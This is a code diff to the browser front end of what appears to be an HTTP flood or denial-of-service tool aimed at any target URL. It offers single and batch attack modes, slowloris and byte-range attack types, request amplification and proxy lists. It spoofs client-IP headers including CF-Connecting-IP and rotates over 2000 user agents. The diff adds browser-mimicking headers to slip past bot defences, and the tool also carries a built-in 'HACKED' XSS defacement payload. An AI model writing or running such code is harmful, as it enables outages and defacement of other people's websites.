@@ -65,7 +65,7 @@ if (amplifyToggle) {
 if (amplifyKb) {
   amplifyKb.addEventListener('input', () => {
     amplificationKB = parseFloat(amplifyKb.value);
-    if (amplifyValue) amplifyValue.innerText = amplificationKB + ' KB';
+    amplifyValue.innerText = amplificationKB + ' KB';
   });
 }
 if (amplifyType) {
@@ -92,7 +92,7 @@ if (intervalInput) {
   });
 }
 
-// Reset Extreme
+// Reset extreme
 const resetExtremeBtn = document.getElementById('resetExtremeBtn');
 if (resetExtremeBtn) {
   resetExtremeBtn.addEventListener('click', () => {
@@ -120,6 +120,7 @@ if (resetExtremeBtn) {
   });
 }
 
+// Chart & state
 let chart;
 let abortController = null;
 let isRunning = false;
@@ -158,26 +159,26 @@ function addLog(msg, isError = false) {
 }
 
 function updateUI() {
-  if (successSpan) successSpan.innerText = stats.success;
-  if (failSpan) failSpan.innerText = stats.fail;
+  successSpan.innerText = stats.success;
+  failSpan.innerText = stats.fail;
   const done = stats.success + stats.fail;
   const errorRate = done === 0 ? 0 : (stats.fail / done * 100).toFixed(1);
-  if (errorRateSpan) errorRateSpan.innerText = errorRate + '%';
-  if (totalBytesSpan) totalBytesSpan.innerText = (stats.totalBytes / 1024).toFixed(1);
+  errorRateSpan.innerText = errorRate + '%';
+  totalBytesSpan.innerText = (stats.totalBytes / 1024).toFixed(1);
   if (stats.times.length) {
     const avg = stats.times.reduce((a,b)=>a+b,0)/stats.times.length;
-    if (avgSpan) avgSpan.innerText = avg.toFixed(1);
-  } else if (avgSpan) avgSpan.innerText = "0";
+    avgSpan.innerText = avg.toFixed(1);
+  } else avgSpan.innerText = "0";
   if (stats.startTime && isRunning) {
     const elapsed = (Date.now() - stats.startTime) / 1000;
-    if (elapsed > 0 && rpsSpan) rpsSpan.innerText = (done / elapsed).toFixed(1);
-  } else if (stats.startTime && rpsSpan) {
+    if (elapsed > 0) rpsSpan.innerText = (done / elapsed).toFixed(1);
+  } else if (stats.startTime) {
     const elapsed = (Date.now() - stats.startTime) / 1000;
     if (elapsed > 0) rpsSpan.innerText = (stats.times.length / elapsed).toFixed(1);
   }
   const percent = (done / stats.total) * 100;
-  if (progressBar) progressBar.style.width = `${percent}%`;
-  if (progressText) progressText.innerText = `${done}/${stats.total}`;
+  progressBar.style.width = `${percent}%`;
+  progressText.innerText = `${done}/${stats.total}`;
   updateTrafficEstimator();
 }
 
@@ -200,14 +201,14 @@ function resetStats() {
   updateUI();
 }
 
-// Random helpers
+// Helper functions untuk spoofing
 function randomIP(prefix) { return prefix + Math.floor(Math.random() * 255); }
 function randomRange() { const s = Math.floor(Math.random()*1000); return `bytes=${s}-${s+Math.floor(Math.random()*500)}`; }
 function randomAcceptLanguage() { const langs = ['en-US,en;q=0.9','id-ID,id;q=0.9','de-DE,de;q=0.8','ja-JP,ja;q=0.8']; return langs[Math.floor(Math.random()*langs.length)]; }
 function parseCustomHeaders(jsonStr) { try { return JSON.parse(jsonStr); } catch(e){ return {}; } }
 function parseCookies(cookieStr) { const obj = {}; cookieStr.split(';').forEach(c => { let [k,v]=c.trim().split('='); if(k) obj[k]=v||''; }); return obj; }
 
-// 2000+ User Agents
+// 2000+ User Agents (browser real)
 const userAgentsBase = [
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15",
@@ -222,6 +223,7 @@ for (let i = 0; i < 2000; i++) {
 }
 function randomUserAgent() { return userAgentsBase[Math.floor(Math.random() * userAgentsBase.length)]; }
 
+// Auto payload
 function generatePayload(type) {
   switch(type) {
     case 'xss': return `<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:red;z-index:99999;text-align:center;padding-top:20%"><h1>HACKED</h1><script>alert('XSS')</scr` + `ipt></div>`;
@@ -236,42 +238,40 @@ if (autoPayloadSelect) {
   autoPayloadSelect.addEventListener('change', () => { if(autoPayloadSelect.value) payload.value = generatePayload(autoPayloadSelect.value); });
 }
 
-// ======================== SINGLE ATTACK ========================
+// ======================== SINGLE ATTACK (perbaikan) ========================
 async function sendSingleRequest(url, method, body, timeout, retryCount, randomDelay, keepAlive, attackType) {
+  // Headers seperti browser sungguhan
   let headers = {};
-  if (randomHeadersCheck.checked) {
-    headers["User-Agent"] = randomUserAgent();
-    headers["Accept-Language"] = randomAcceptLanguage();
-  } else {
-    headers["User-Agent"] = randomUserAgent();
-  }
-  headers["Accept"] = "*/*";
-  headers["Cache-Control"] = "no-cache";
-  const spoofSettings = {
-    spoofIp: spoofIp.checked, spoofRealIp: spoofRealIp.checked,
-    spoofCfConnecting: spoofCfConnecting.checked, spoofRange: spoofRange.checked
-  };
-  if (spoofSettings.spoofIp) headers["X-Forwarded-For"] = randomIP(ipPrefixInput.value);
-  if (spoofSettings.spoofRealIp) headers["X-Real-IP"] = randomIP(ipPrefixInput.value);
-  if (spoofSettings.spoofCfConnecting) headers["CF-Connecting-IP"] = randomIP(ipPrefixInput.value);
-  if (spoofSettings.spoofRange && attackType !== 'range') headers["Range"] = randomRange();
-  const cookieHeader = parseCookies(cookies.value);
-  const cookieStr = Object.entries(cookieHeader).map(([k,v])=>`${k}=${v}`).join('; ');
+  // Random user agent
+  headers["User-Agent"] = randomUserAgent();
+  headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
+  headers["Accept-Language"] = randomAcceptLanguage();
+  headers["Accept-Encoding"] = "gzip, deflate, br";
+  headers["Connection"] = keepAlive ? "keep-alive" : "close";
+  headers["Upgrade-Insecure-Requests"] = "1";
+  headers["Sec-Fetch-Dest"] = "document";
+  headers["Sec-Fetch-Mode"] = "navigate";
+  headers["Sec-Fetch-Site"] = "none";
+  headers["Sec-Fetch-User"] = "?1";
+  
+  // Custom headers dari user
+  const customHeadersObj = parseCustomHeaders(customHeaders.value);
+  Object.assign(headers, customHeadersObj);
+  
+  // Spoofing IP
+  if (spoofIp.checked) headers["X-Forwarded-For"] = randomIP(ipPrefixInput.value);
+  if (spoofRealIp.checked) headers["X-Real-IP"] = randomIP(ipPrefixInput.value);
+  if (spoofCfConnecting.checked) headers["CF-Connecting-IP"] = randomIP(ipPrefixInput.value);
+  if (spoofRange.checked && attackType !== 'range') headers["Range"] = randomRange();
+  
+  // Cookies
+  const cookieObj = parseCookies(cookies.value);
+  const cookieStr = Object.entries(cookieObj).map(([k,v])=>`${k}=${v}`).join('; ');
   if (cookieStr) headers["Cookie"] = cookieStr;
+  
   if (attackType === 'slowloris') headers["Connection"] = "keep-alive";
+
   const proxyArray = proxyListText.value ? proxyListText.value.split('\n').filter(p=>p.trim()) : [];
-
-  // Human behavior: add random query parameter to URL
-  let finalUrl = url;
-  const rnd = Math.random().toString(36).substring(2, 8);
-  finalUrl += (finalUrl.includes('?') ? '&' : '?') + `_rnd=${rnd}`;
-
-  // Randomize body field if POST/PUT (only if not empty)
-  let finalBody = body;
-  if ((method.toUpperCase() === 'POST' || method.toUpperCase() === 'PUT') && finalBody && finalBody.trim()) {
-    const rndField = `_human=${Math.floor(Math.random()*10000)}`;
-    finalBody += (finalBody.includes('&') ? '&' : (finalBody.trim().startsWith('{') ? ',' : '&')) + rndField;
-  }
 
   const controller = new AbortController();
   const tid = setTimeout(() => controller.abort(), timeout);
@@ -281,7 +281,7 @@ async function sendSingleRequest(url, method, body, timeout, retryCount, randomD
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        url: finalUrl, method, headers, body: finalBody || "",
+        url, method, headers, body: body || "",
         timeout, retryCount, randomDelay,
         keepAlive, attackType,
         amplifyKB: amplificationEnabled ? amplificationKB : 0,
@@ -377,7 +377,7 @@ async function startSingleAttack() {
     }
     let preview = `HTTP ${statusCode || '??'} | ${duration.toFixed(0)}ms`;
     if (responseBody) preview += `\nBody: ${responseBody.substring(0, 200)}`;
-    if (rawResponsePreview) rawResponsePreview.innerText = preview;
+    rawResponsePreview.innerText = preview;
     updateUI();
   };
   try {
@@ -395,7 +395,7 @@ async function startSingleAttack() {
   }
 }
 
-// ======================== BATCH ATTACK (dengan perilaku manusia) ========================
+// ======================== BATCH ATTACK (perbaikan dengan human-like headers) ========================
 async function startBatchAttack() {
   if (isRunning) { addLog("Attack already running! Stop it first.", true); return; }
   let url = targetUrl.value.trim();
@@ -403,42 +403,44 @@ async function startBatchAttack() {
   if (!url.startsWith("http")) url = "https://" + url;
   const total = parseInt(totalInput.value);
   const concurrency = parseInt(concurrencyInput.value);
-  if (!total || !concurrency) return;
+  if (isNaN(total) || isNaN(concurrency)) { addLog("Invalid total or concurrency", true); return; }
   const mtd = method.value;
   let body = payload.value;
   const autoType = autoPayloadSelect?.value || "";
   if (autoType && autoType !== "") body = generatePayload(autoType);
   const timeout = parseInt(timeoutInput.value);
   const retryCount = parseInt(retryInput.value);
-  let randomDelay = parseInt(randomDelayInput.value);
-  // Untuk perilaku manusia, kita tambahkan random delay minimal 50ms jika tidak diatur
-  if (randomDelay === 0) randomDelay = 50;
+  const randomDelay = parseInt(randomDelayInput.value);
   const keepAlive = keepAliveCheck.checked;
   let attackType = attackTypeSelect.value;
-  let customHeadersObj = parseCustomHeaders(customHeaders.value);
-  let cookiesObj = parseCookies(cookies.value);
-  const spoofSettings = {
-    spoofIp: spoofIp.checked, spoofRealIp: spoofRealIp.checked,
-    spoofCfConnecting: spoofCfConnecting.checked, spoofRange: spoofRange.checked
-  };
-  const ipPrefix = ipPrefixInput.value;
-  let finalHeaders = { ...customHeadersObj };
-  if (randomHeadersCheck.checked) {
-    finalHeaders["User-Agent"] = randomUserAgent();
-    finalHeaders["Accept-Language"] = randomAcceptLanguage();
-  } else {
-    finalHeaders["User-Agent"] = randomUserAgent();
-  }
-  finalHeaders["Accept"] = "*/*";
-  if (spoofSettings.spoofIp) finalHeaders["X-Forwarded-For"] = randomIP(ipPrefix);
-  if (spoofSettings.spoofRealIp) finalHeaders["X-Real-IP"] = randomIP(ipPrefix);
-  if (spoofSettings.spoofCfConnecting) finalHeaders["CF-Connecting-IP"] = randomIP(ipPrefix);
-  if (spoofSettings.spoofRange && attackType !== 'range') finalHeaders["Range"] = randomRange();
-  const cookieHeader = Object.entries(cookiesObj).map(([k,v])=>`${k}=${v}`).join('; ');
-  if (cookieHeader) finalHeaders["Cookie"] = cookieHeader;
+  
+  // Build headers seperti browser (sama seperti single attack)
+  let finalHeaders = {};
+  finalHeaders["User-Agent"] = randomUserAgent();
+  finalHeaders["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
+  finalHeaders["Accept-Language"] = randomAcceptLanguage();
+  finalHeaders["Accept-Encoding"] = "gzip, deflate, br";
+  finalHeaders["Connection"] = keepAlive ? "keep-alive" : "close";
+  finalHeaders["Upgrade-Insecure-Requests"] = "1";
+  finalHeaders["Sec-Fetch-Dest"] = "document";
+  finalHeaders["Sec-Fetch-Mode"] = "navigate";
+  finalHeaders["Sec-Fetch-Site"] = "none";
+  finalHeaders["Sec-Fetch-User"] = "?1";
+  // Custom headers
+  const customHeadersObj = parseCustomHeaders(customHeaders.value);
+  Object.assign(finalHeaders, customHeadersObj);
+  // Spoofing
+  const ipPref = ipPrefixInput.value;
+  if (spoofIp.checked) finalHeaders["X-Forwarded-For"] = randomIP(ipPref);
+  if (spoofRealIp.checked) finalHeaders["X-Real-IP"] = randomIP(ipPref);
+  if (spoofCfConnecting.checked) finalHeaders["CF-Connecting-IP"] = randomIP(ipPref);
+  if (spoofRange.checked && attackType !== 'range') finalHeaders["Range"] = randomRange();
+  const cookieObj = parseCookies(cookies.value);
+  const cookieStr = Object.entries(cookieObj).map(([k,v])=>`${k}=${v}`).join('; ');
+  if (cookieStr) finalHeaders["Cookie"] = cookieStr;
   if (attackType === 'slowloris') finalHeaders["Connection"] = "keep-alive";
 
-  addLog(`💀 BATCH ATTACK | ${mtd} ${url} | Total:${total} | Workers:${concurrency} | Continuous:${continuousMode} | Amp:${amplificationEnabled?amplificationKB+"KB":"OFF"} | Human delay:${randomDelay}ms`);
+  addLog(`💀 BATCH ATTACK | ${mtd} ${url} | Total:${total} | Workers:${concurrency} | Continuous:${continuousMode} | Amp:${amplificationEnabled?amplificationKB+"KB":"OFF"}`);
   startBtn.disabled = true;
   batchBtn.disabled = true;
   stopBtn.disabled = false;
@@ -472,7 +474,7 @@ async function startBatchAttack() {
       stats.times = data.latencies || [];
       updateUI();
       addLog(`✅ BATCH FINISHED | Success:${data.successCount} Fail:${data.failCount} | RPS:${data.rps} | Loops:${data.loopCount||1} | Time:${(data.totalTimeMs/1000).toFixed(2)}s`);
-      if (rawResponsePreview) rawResponsePreview.innerText = `Batch completed: ${data.successCount}/${data.totalRequests} success`;
+      rawResponsePreview.innerText = `Batch completed: ${data.successCount}/${data.totalRequests} success`;
     } else {
       addLog(`Batch error: ${data.error}`, true);
     }
@@ -528,26 +530,28 @@ if (refreshPreviewBtn) {
   refreshPreviewBtn.onclick = () => { let u = targetUrl.value.trim(); if(u) updatePreview(u); checkTargetHealth(u); };
 }
 function startHealthCheck() { if(healthCheckInterval) clearInterval(healthCheckInterval); healthCheckInterval = setInterval(() => { let u = targetUrl.value.trim(); if(u) checkTargetHealth(u); }, 5000); }
-async function updateActiveUsers() { try { const res = await fetch('/api/heartbeat'); const data = await res.json(); if (activeUsersSpan) activeUsersSpan.innerText = data.active; } catch(e) {} }
+async function updateActiveUsers() { try { const res = await fetch('/api/heartbeat'); const data = await res.json(); if(activeUsersSpan) activeUsersSpan.innerText = data.active; } catch(e) {} }
 function startHeartbeat() { heartbeatInterval = setInterval(updateActiveUsers, 30000); updateActiveUsers(); }
 
 window.onload = () => {
-  const ctx = rtChartCanvas?.getContext('2d');
-  if (ctx) {
+  if (rtChartCanvas) {
+    const ctx = rtChartCanvas.getContext('2d');
     chart = new Chart(ctx, {
       type: 'line',
       data: { labels: Array(30).fill(''), datasets: [{ label: 'Response (ms)', data: [], borderColor: '#ff4444', backgroundColor: '#ff000033', tension: 0.2, fill: true, pointRadius: 1 }] },
       options: { responsive: true, maintainAspectRatio: true, scales: { y: { title: { display: true, text: 'ms' } } } }
     });
   }
-  if (startBtn) startBtn.onclick = startSingleAttack;
-  if (batchBtn) batchBtn.onclick = startBatchAttack;
-  if (stopBtn) stopBtn.onclick = stopAttack;
-  if (exportBtn) exportBtn.onclick = exportCSV;
+  startBtn.onclick = startSingleAttack;
+  batchBtn.onclick = startBatchAttack;
+  stopBtn.onclick = stopAttack;
+  exportBtn.onclick = exportCSV;
   fetch('/api/status').then(r=>r.json()).then(d=>addLog(`Backend: ${d.message}`)).catch(()=>addLog("Backend OK"));
-  let u = targetUrl?.value.trim(); if(u) updatePreview(u);
+  let u = targetUrl.value.trim(); if(u) updatePreview(u);
   startHealthCheck();
   startHeartbeat();
+  // initial UI
   if (amplifyToggle) amplifyToggle.dispatchEvent(new Event('change'));
+  if (continuousToggle) continuousToggle.dispatchEvent(new Event('change'));
   if (amplifyKb) amplifyKb.dispatchEvent(new Event('input'));
 };
